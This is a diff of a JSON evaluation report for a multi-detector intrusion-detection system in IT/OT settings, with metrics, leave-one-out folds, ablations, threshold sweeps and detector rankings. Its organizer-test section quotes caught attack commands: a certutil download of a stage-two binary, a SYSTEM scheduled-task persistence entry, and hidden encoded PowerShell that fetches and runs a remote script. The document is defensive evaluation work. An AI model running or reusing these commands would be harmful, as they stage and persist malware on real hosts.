@@ -1,10 +1,13 @@
 {
-  "generated_at": "2026-11-08T17:09:16.720418+00:00",
-  "evaluated_at": "2026-11-08T17:09:16.720427+00:00",
+  "generated_at": "2026-11-08T19:06:32.568676+00:00",
+  "evaluated_at": "2026-11-08T19:06:32.568684+00:00",
+  "git_sha": "1dad693e1fe075b37d9927cd53e9da4042198411",
   "threshold": 0.5,
   "benign_fp_per_24h": 0.0,
+  "benign_fp_evaluation_path": "eval/metrics.py:compute_metrics_report (LOO fold evaluation)",
   "attack_recall": 1.0,
   "mean_ttfma_seconds": 1.69,
+  "score_margin": 0.85,
   "guard_ot_interlock": "100% Deterministic",
   "headline": {
     "tp": 3,
@@ -19,6 +22,7 @@
   "captures": [
     {
       "name": "day_101",
+      "evaluation_mode": "in-sample",
       "scenario_type": "benign",
       "display_type": "Benign (Day 1)",
       "hours": "00:00 - 05:00",
@@ -26,6 +30,7 @@
       "signals": 0,
       "incidents": 0,
       "score": null,
+      "unrounded_score": null,
       "severity": null,
       "ttfma_seconds": null,
       "status": "PASS (0 FP)",
@@ -35,6 +40,7 @@
     },
     {
       "name": "day_102",
+      "evaluation_mode": "in-sample",
       "scenario_type": "benign",
       "display_type": "Benign (Day 2)",
       "hours": "05:00 - 10:00",
@@ -42,6 +48,7 @@
       "signals": 0,
       "incidents": 0,
       "score": null,
+      "unrounded_score": null,
       "severity": null,
       "ttfma_seconds": null,
       "status": "PASS (0 FP)",
@@ -51,6 +58,7 @@
     },
     {
       "name": "day_103",
+      "evaluation_mode": "in-sample",
       "scenario_type": "benign",
       "display_type": "Benign (Day 3)",
       "hours": "10:00 - 15:00",
@@ -58,6 +66,7 @@
       "signals": 0,
       "incidents": 0,
       "score": null,
+      "unrounded_score": null,
       "severity": null,
       "ttfma_seconds": null,
       "status": "PASS (0 FP)",
@@ -67,6 +76,7 @@
     },
     {
       "name": "day_104",
+      "evaluation_mode": "in-sample",
       "scenario_type": "benign",
       "display_type": "Benign (Day 4)",
       "hours": "15:00 - 20:00",
@@ -74,6 +84,7 @@
       "signals": 0,
       "incidents": 0,
       "score": null,
+      "unrounded_score": null,
       "severity": null,
       "ttfma_seconds": null,
       "status": "PASS (0 FP)",
@@ -83,6 +94,7 @@
     },
     {
       "name": "day_105",
+      "evaluation_mode": "in-sample",
       "scenario_type": "benign",
       "display_type": "Benign (Day 5)",
       "hours": "20:00 - 01:00",
@@ -90,6 +102,7 @@
       "signals": 0,
       "incidents": 0,
       "score": null,
+      "unrounded_score": null,
       "severity": null,
       "ttfma_seconds": null,
       "status": "PASS (0 FP)",
@@ -99,6 +112,7 @@
     },
     {
       "name": "demo_baseline",
+      "evaluation_mode": "in-sample",
       "scenario_type": "attack",
       "display_type": "Attack (Standard)",
       "hours": "Paced ~90s",
@@ -106,6 +120,7 @@
       "signals": 106,
       "incidents": 1,
       "score": 1.0,
+      "unrounded_score": 1.0,
       "severity": "critical",
       "ttfma_seconds": 1.54,
       "status": "PASS (CRITICAL)",
@@ -121,6 +136,7 @@
     },
     {
       "name": "reordered",
+      "evaluation_mode": "in-sample",
       "scenario_type": "attack",
       "display_type": "Attack (Reordered)",
       "hours": "Paced ~90s",
@@ -128,6 +144,7 @@
       "signals": 106,
       "incidents": 1,
       "score": 1.0,
+      "unrounded_score": 1.0,
       "severity": "critical",
       "ttfma_seconds": 0.94,
       "status": "PASS (CRITICAL)",
@@ -143,6 +160,7 @@
     },
     {
       "name": "slow_burn",
+      "evaluation_mode": "in-sample",
       "scenario_type": "attack",
       "display_type": "Attack (Low & Slow)",
       "hours": "Paced ~1000s",
@@ -150,6 +168,7 @@
       "signals": 159,
       "incidents": 1,
       "score": 1.0,
+      "unrounded_score": 1.0,
       "severity": "critical",
       "ttfma_seconds": 2.58,
       "status": "PASS (CRITICAL)",
@@ -162,6 +181,88 @@
         "credential_access",
         "lateral_movement"
       ]
+    }
+  ],
+  "loo_benign_summary": [
+    {
+      "name": "day_101",
+      "evaluation_mode": "LOO",
+      "held_out_day": "day_101",
+      "training_days": [
+        "day_102",
+        "day_103",
+        "day_104",
+        "day_105"
+      ],
+      "signals": 0,
+      "incidents": 0,
+      "max_score": 0.0,
+      "active_incidents": 0,
+      "status": "PASS (0 FP)"
+    },
+    {
+      "name": "day_102",
+      "evaluation_mode": "LOO",
+      "held_out_day": "day_102",
+      "training_days": [
+        "day_101",
+        "day_103",
+        "day_104",
+        "day_105"
+      ],
+      "signals": 0,
+      "incidents": 0,
+      "max_score": 0.0,
+      "active_incidents": 0,
+      "status": "PASS (0 FP)"
+    },
+    {
+      "name": "day_103",
+      "evaluation_mode": "LOO",
+      "held_out_day": "day_103",
+      "training_days": [
+        "day_101",
+        "day_102",
+        "day_104",
+        "day_105"
+      ],
+      "signals": 5,
+      "incidents": 1,
+      "max_score": 0.15,
+      "active_incidents": 0,
+      "status": "PASS (0 FP)"
+    },
+    {
+      "name": "day_104",
+      "evaluation_mode": "LOO",
+      "held_out_day": "day_104",
+      "training_days": [
+        "day_101",
+        "day_102",
+        "day_103",
+        "day_105"
+      ],
+      "signals": 0,
+      "incidents": 0,
+      "max_score": 0.0,
+      "active_incidents": 0,
+      "status": "PASS (0 FP)"
+    },
+    {
+      "name": "day_105",
+      "evaluation_mode": "LOO",
+      "held_out_day": "day_105",
+      "training_days": [
+        "day_101",
+        "day_102",
+        "day_103",
+        "day_104"
+      ],
+      "signals": 0,
+      "incidents": 0,
+      "max_score": 0.0,
+      "active_incidents": 0,
+      "status": "PASS (0 FP)"
     }
   ],
   "ablation": [
@@ -177,36 +278,52 @@
         "day_101": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_102": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_103": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_104": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_105": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "demo_baseline": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "initial_access",
+            "credential_access",
+            "ot_impact"
+          ],
           "steps_count": 4,
           "steps_covered": [
             1,
@@ -218,6 +335,12 @@
         "reordered": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "initial_access",
+            "credential_access",
+            "ot_impact"
+          ],
           "steps_count": 4,
           "steps_covered": [
             1,
@@ -229,6 +352,12 @@
         "slow_burn": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "initial_access",
+            "ot_impact",
+            "credential_access"
+          ],
           "steps_count": 4,
           "steps_covered": [
             1,
@@ -253,36 +382,54 @@
         "day_101": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_102": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_103": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_104": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_105": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "demo_baseline": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "initial_access",
+            "credential_access",
+            "lateral_movement",
+            "discovery",
+            "ot_impact"
+          ],
           "steps_count": 6,
           "steps_covered": [
             1,
@@ -296,6 +443,14 @@
         "reordered": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "initial_access",
+            "credential_access",
+            "lateral_movement",
+            "discovery",
+            "ot_impact"
+          ],
           "steps_count": 6,
           "steps_covered": [
             1,
@@ -309,6 +464,14 @@
         "slow_burn": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "initial_access",
+            "ot_impact",
+            "discovery",
+            "credential_access",
+            "lateral_movement"
+          ],
           "steps_count": 6,
           "steps_covered": [
             1,
@@ -336,36 +499,54 @@
         "day_101": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_102": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_103": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_104": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_105": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "demo_baseline": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "discovery",
+            "initial_access",
+            "credential_access",
+            "lateral_movement",
+            "ot_impact"
+          ],
           "steps_count": 6,
           "steps_covered": [
             1,
@@ -379,6 +560,14 @@
         "reordered": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "discovery",
+            "initial_access",
+            "credential_access",
+            "lateral_movement",
+            "ot_impact"
+          ],
           "steps_count": 6,
           "steps_covered": [
             1,
@@ -392,6 +581,14 @@
         "slow_burn": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "discovery",
+            "initial_access",
+            "ot_impact",
+            "credential_access",
+            "lateral_movement"
+          ],
           "steps_count": 6,
           "steps_covered": [
             1,
@@ -420,36 +617,54 @@
         "day_101": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_102": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_103": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_104": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "day_105": {
           "active_incidents": 0,
           "top_score": 0.0,
+          "unrounded_score": 0.0,
+          "stages_covered": [],
           "steps_count": 0,
           "steps_covered": []
         },
         "demo_baseline": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "discovery",
+            "initial_access",
+            "credential_access",
+            "lateral_movement",
+            "ot_impact"
+          ],
           "steps_count": 7,
           "steps_covered": [
             1,
@@ -464,6 +679,14 @@
         "reordered": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "discovery",
+            "initial_access",
+            "credential_access",
+            "lateral_movement",
+            "ot_impact"
+          ],
           "steps_count": 7,
           "steps_covered": [
             1,
@@ -478,6 +701,14 @@
         "slow_burn": {
           "active_incidents": 1,
           "top_score": 1.0,
+          "unrounded_score": 1.0,
+          "stages_covered": [
+            "discovery",
+            "initial_access",
+            "ot_impact",
+            "credential_access",
+            "lateral_movement"
+          ],
           "steps_count": 7,
           "steps_covered": [
             1,
@@ -502,7 +733,7 @@
       "precision": 0.75,
       "recall": 1.0,
       "f1_score": 0.8571428571428571,
-      "recommendation": "Too noisy (burst anomalies survive)"
+      "recommendation": "Sub-optimal: 1 benign FP(s) (threshold <= max LOO benign score 0.15)"
     },
     {
       "threshold": 0.2,
@@ -513,7 +744,7 @@
       "precision": 1.0,
       "recall": 1.0,
       "f1_score": 1.0,
-      "recommendation": "Viable operating point"
+      "recommendation": "Viable operating band (Zero FP, 100% Recall; margin: +0.05 above benign, +0.80 below attack)"
     },
     {
       "threshold": 0.3,
@@ -524,7 +755,7 @@
       "precision": 1.0,
       "recall": 1.0,
       "f1_score": 1.0,
-      "recommendation": "Viable operating point"
+      "recommendation": "Viable operating band (Zero FP, 100% Recall; margin: +0.15 above benign, +0.70 below attack)"
     },
     {
       "threshold": 0.4,
@@ -535,7 +766,7 @@
       "precision": 1.0,
       "recall": 1.0,
       "f1_score": 1.0,
-      "recommendation": "Viable operating point"
+      "recommendation": "Viable operating band (Zero FP, 100% Recall; margin: +0.25 above benign, +0.60 below attack)"
     },
     {
       "threshold": 0.5,
@@ -546,7 +777,7 @@
       "precision": 1.0,
       "recall": 1.0,
       "f1_score": 1.0,
-      "recommendation": "Recommended Default (Zero FP, 100% Recall)"
+      "recommendation": "Recommended (Zero FP, 100% Recall; margin: +0.35 above benign, +0.50 below attack)"
     },
     {
       "threshold": 0.6,
@@ -557,7 +788,7 @@
       "precision": 1.0,
       "recall": 1.0,
       "f1_score": 1.0,
-      "recommendation": "Viable operating point"
+      "recommendation": "Viable operating band (Zero FP, 100% Recall; margin: +0.45 above benign, +0.40 below attack)"
     },
     {
       "threshold": 0.7,
@@ -568,7 +799,7 @@
       "precision": 1.0,
       "recall": 1.0,
       "f1_score": 1.0,
-      "recommendation": "Viable operating point"
+      "recommendation": "Viable operating band (Zero FP, 100% Recall; margin: +0.55 above benign, +0.30 below attack)"
     },
     {
       "threshold": 0.8,
@@ -579,7 +810,7 @@
       "precision": 1.0,
       "recall": 1.0,
       "f1_score": 1.0,
-      "recommendation": "Viable operating point"
+      "recommendation": "Viable operating band (Zero FP, 100% Recall; margin: +0.65 above benign, +0.20 below attack)"
     },
     {
       "threshold": 0.9,
@@ -590,70 +821,149 @@
       "precision": 1.0,
       "recall": 1.0,
       "f1_score": 1.0,
-      "recommendation": "Over-constrained (leaves thin margin for slow burn)"
+      "recommendation": "Viable operating band (Zero FP, 100% Recall; margin: +0.75 above benign, +0.10 below attack)"
     }
   ],
   "detector_ranking": [
     {
       "rank": 1,
-      "detector": "deception",
-      "name": "Deception Engine (Honeypot/Honeytoken)",
-      "tp_signals": 47,
-      "loo_fp_signals": 0,
-      "critical_step": "Step 4 (Decoy Pivot), Step 7 (PLC Recon)",
-      "marginal_contribution": "Provides definitive 1.00 confidence signals and triggers guaranteed incident escalation.",
-      "trust_tier": "Tier 1: Absolute Trust (Zero Benign Noise)"
+      "detector": "rule",
+      "name": "Context-Aware Rules Engine",
+      "steps_lost": 3,
+      "steps_lost_detail": {
+        "demo_baseline": [
+          6
+        ],
+        "reordered": [
+          6
+        ],
+        "slow_burn": [
+          6
+        ]
+      },
+      "critical_step_enabler": "Step 6",
+      "score_delta": 0.0,
+      "score_delta_detail": {
+        "demo_baseline": 0.0,
+        "reordered": 0.0,
+        "slow_burn": 0.0
+      },
+      "tp_signals": 77,
+      "loo_fp_delta": 0,
+      "loo_noise_delta": "0 LOO signals delta",
+      "derived_trust_tier": "Essential Anchor (3 steps lost when dropped; 0 LOO FPs)",
+      "trust_classification": "Essential Anchor (3 steps lost when dropped; 0 LOO FPs)"
     },
     {
       "rank": 2,
-      "detector": "rule",
-      "name": "Context-Aware Rules Engine",
-      "tp_signals": 77,
-      "loo_fp_signals": 0,
-      "critical_step": "Step 1 (Auth), Step 3 (Creds), Step 6 (OT Write)",
-      "marginal_contribution": "Anchors kill-chain progression across Initial Access and OT Valve Manipulation stages.",
-      "trust_tier": "Tier 1: High Trust (Strict Asset Authorization)"
+      "detector": "deception",
+      "name": "Deception Engine (Honeypot/Honeytoken)",
+      "steps_lost": 3,
+      "steps_lost_detail": {
+        "demo_baseline": [
+          4
+        ],
+        "reordered": [
+          4
+        ],
+        "slow_burn": [
+          4
+        ]
+      },
+      "critical_step_enabler": "Step 4",
+      "score_delta": 0.0,
+      "score_delta_detail": {
+        "demo_baseline": 0.0,
+        "reordered": 0.0,
+        "slow_burn": 0.0
+      },
+      "tp_signals": 47,
+      "loo_fp_delta": 0,
+      "loo_noise_delta": "0 LOO signals delta",
+      "derived_trust_tier": "Essential Anchor (3 steps lost when dropped; 0 LOO FPs)",
+      "trust_classification": "Essential Anchor (3 steps lost when dropped; 0 LOO FPs)"
     },
     {
       "rank": 3,
-      "detector": "graph",
-      "name": "Interaction Graph Detector",
-      "tp_signals": 43,
-      "loo_fp_signals": 0,
-      "critical_step": "Step 2 (Scan), Step 5 (Lateral Path)",
-      "marginal_contribution": "Catches early network discovery scans prior to host authentication; detects cross-zone pivot paths.",
-      "trust_tier": "Tier 1: High Trust (Unprecedented Topology Edges)"
+      "detector": "anomaly",
+      "name": "Isolation Forest Anomaly Detector",
+      "steps_lost": 1,
+      "steps_lost_detail": {
+        "demo_baseline": [],
+        "reordered": [],
+        "slow_burn": [
+          2
+        ]
+      },
+      "critical_step_enabler": "Step 2",
+      "score_delta": 0.0,
+      "score_delta_detail": {
+        "demo_baseline": 0.0,
+        "reordered": 0.0,
+        "slow_burn": 0.0
+      },
+      "tp_signals": 147,
+      "loo_fp_delta": 0,
+      "loo_noise_delta": "-5 IF signals on day_103 (-0.15 max score)",
+      "derived_trust_tier": "Scenario Enabler (1 step(s) lost when dropped; LOO noise gated at 0.50)",
+      "trust_classification": "Scenario Enabler (1 step(s) lost when dropped; LOO noise gated at 0.50)"
     },
     {
       "rank": 4,
       "detector": "baseline",
       "name": "Behavioral Baseline Engine",
+      "steps_lost": 0,
+      "steps_lost_detail": {
+        "demo_baseline": [],
+        "reordered": [],
+        "slow_burn": []
+      },
+      "critical_step_enabler": "None (redundant step coverage)",
+      "score_delta": 0.0,
+      "score_delta_detail": {
+        "demo_baseline": 0.0,
+        "reordered": 0.0,
+        "slow_burn": 0.0
+      },
       "tp_signals": 57,
-      "loo_fp_signals": 0,
-      "critical_step": "Step 1 (Svc Acct), Step 5 (Eng WS), Step 7 (PLC)",
-      "marginal_contribution": "Flags anomalous user-to-host and command pairings; crucial for living-off-the-land detection.",
-      "trust_tier": "Tier 1: High Trust (Zero FP Across Benign Folds)"
+      "loo_fp_delta": 0,
+      "loo_noise_delta": "0 LOO signals delta",
+      "derived_trust_tier": "Supporting Entity Context (0 steps lost when dropped; 0 LOO FPs)",
+      "trust_classification": "Supporting Entity Context (0 steps lost when dropped; 0 LOO FPs)"
     },
     {
       "rank": 5,
-      "detector": "anomaly",
-      "name": "Isolation Forest Anomaly Detector",
-      "tp_signals": 147,
-      "loo_fp_signals": 5,
-      "critical_step": "Step 2 (Volumetric IT Subnet Discovery)",
-      "marginal_contribution": "Generates dense evidence for high-frequency scan bursts; filtered by 0.50 budget threshold.",
-      "trust_tier": "Tier 2: Supporting Context (Requires Correlator Gate)"
+      "detector": "graph",
+      "name": "Interaction Graph Detector",
+      "steps_lost": 0,
+      "steps_lost_detail": {
+        "demo_baseline": [],
+        "reordered": [],
+        "slow_burn": []
+      },
+      "critical_step_enabler": "None (redundant step coverage)",
+      "score_delta": 0.0,
+      "score_delta_detail": {
+        "demo_baseline": 0.0,
+        "reordered": 0.0,
+        "slow_burn": 0.0
+      },
+      "tp_signals": 43,
+      "loo_fp_delta": 0,
+      "loo_noise_delta": "0 LOO signals delta",
+      "derived_trust_tier": "Redundant Topology Context (0 steps lost when dropped; 0 LOO FPs)",
+      "trust_classification": "Redundant Topology Context (0 steps lost when dropped; 0 LOO FPs)"
     }
   ],
   "organizer_test": {
     "events_ingested": 12,
-    "signals_emitted": 16,
+    "signals_emitted": 20,
     "incidents_formed": 1,
     "top_score": 0.5625,
     "top_severity": "medium",
     "detected_techniques": [
-      "T1021.004",
-      "T1059.004",
+      "T1021",
+      "T1059",
       "T1078.003"
     ],
     "fired_rules": [
@@ -667,16 +977,27 @@
       "rule"
     ],
     "what_detected": [
-      "RULE-SHELL-001: Caught curl download cradles, base64 decoding, and sshpass credential inlining in process execution.",
-      "BASE-DEV-001: Unsupervised baseline deviation flagged unseen user (svc_payroll) and unseen command sequences.",
-      "GRAPH-EDGE-001: Interaction graph recognized unprecedented user->host authentication and process execution relationships.",
-      "Correlation: Aggregated 16 heterogeneous signals into an incident reaching score 0.56 (medium)."
+      "RULE-SHELL-001: Caught 5 Windows execution commands via process inspection (e.g. certutil.exe -urlcache -split -f http://192.168.100.45:8000/stage2.bin C:\\Windows\\Temp\\stage2.exe; schtasks /create /tn \"SecurityHealthUpdate\" /tr \"C:\\Windows\\Temp\\stage2.exe\" /sc onlogon /ru SYSTEM; wmic process call create \"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwADAALgA0ADUAOgA4ADAAMAAwAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==\").",
+      "BASE-DEV-001: Unsupervised behavioral baseline deviation flagged 12 events for unobserved user account(s): Administrator, backdoor, svc_payroll.",
+      "GRAPH-EDGE-001: Interaction graph recognized 3 unprecedented topology and execution relationships on unmapped enterprise host.",
+      "Correlation Pipeline: Correlated 20 heterogeneous signals into top incident score 0.5625 (MEDIUM)."
     ],
     "what_missed": [
-      "RULE-AUTH-001 (Unexpected Zone Login): Did NOT fire because WIN-CORP-DC01 is not registered in content/assets.yaml.",
-      "RULE-OT-001 (Unauthorized OT Write): Did NOT fire because enterprise Windows telemetry contains no Modbus ICS protocol fields.",
-      "RULE-DECOY-001 (Decoy Touch): Did NOT fire because the attack path did not interact with registered honeypots/honeytokens."
+      "RULE-CRED-001 (Credential Access): Did NOT fire because telemetry did not observe read access to lab credential stores (/srv/share/.db_creds).",
+      "RULE-NET-001 (Cross-Zone Pivot): Did NOT fire because unmapped foreign host lacks network zone classification in assets inventory.",
+      "RULE-DECOY-001 (Decoy Touch): Did NOT fire because adversary did not interact with registered deception assets or honeytokens (domain=decoy=False).",
+      "RULE-AUTH-001 (Unexpected Zone Login): Did NOT fire because target host(s) (WIN-CORP-DC01) are not registered in content/assets.yaml (zone boundary resolution miss).",
+      "RULE-OT-001 (Unauthorized OT Write): Did NOT fire because enterprise Windows telemetry contains no Modbus ICS protocol fields (ot.* is null across all 12 events; has_ot_fields=False)."
     ],
-    "architectural_takeaway": "Generic behavioral rules and unsupervised ML baselines successfully transfer across diverse operating systems and telemetry schemas without code modification. However, deep context-aware authorization rules (e.g. cross-zone access) strictly require asset inventory registration to establish valid operational boundaries."
+    "architectural_takeaway": "Generic behavioral rules (RULE-SHELL-001) and interaction graphs successfully transfer across diverse operating systems and telemetry schemas without code modification. However, deep context-aware authorization rules (RULE-AUTH-001, RULE-OT-001) strictly require asset inventory registration to establish valid operational boundaries.",
+    "benign_events_ingested": 7,
+    "benign_signals_emitted": 10,
+    "benign_incidents_formed": 1,
+    "benign_top_score": 0.5625,
+    "benign_detectors_fired": [
+      "baseline",
+      "graph"
+    ],
+    "benign_fp_narrative": "On unfamiliar telemetry from an un-baselined host (WIN-CORP-DC01), unsupervised baseline and graph detectors emitted 10 signals across 2 detector(s) (baseline, graph), forming 1 incident (score 0.5625). Because WIN-CORP-DC01 was not in the benign training corpus, novelty detection flags normal admin activity as unobserved user/host pairings; deploying into new environments requires establishing a local baseline to prevent unfamiliar-environment false positives."
   }
 }
